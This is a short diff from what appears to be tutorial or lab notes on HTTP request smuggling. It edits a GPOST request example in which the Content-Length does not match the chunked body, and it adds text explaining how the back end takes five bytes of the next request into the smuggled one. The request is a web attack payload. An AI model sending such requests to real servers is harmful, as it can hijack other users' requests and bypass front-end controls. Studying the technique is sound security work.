@@ -1435,10 +1435,15 @@ GPOST / HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 15
 \r\n
-x=1
+x=1\r\n
 0\r\n  
 \r\n
 ```  
+Body of GPOST request is 10 bytes but Content-Length is 15 ==> 5 Bytes of next request will be included in the Body. If the next request is `POST / HTTP/1.1`, then the word `POST` (5B) will be sent in the body of the smuggled GPOST request:
+
+![dk](images/dualchunk.png)  
+
+The answer is as expected:
 
 ![GPost Obfuscating the TE header](images/gpost.png)  
 
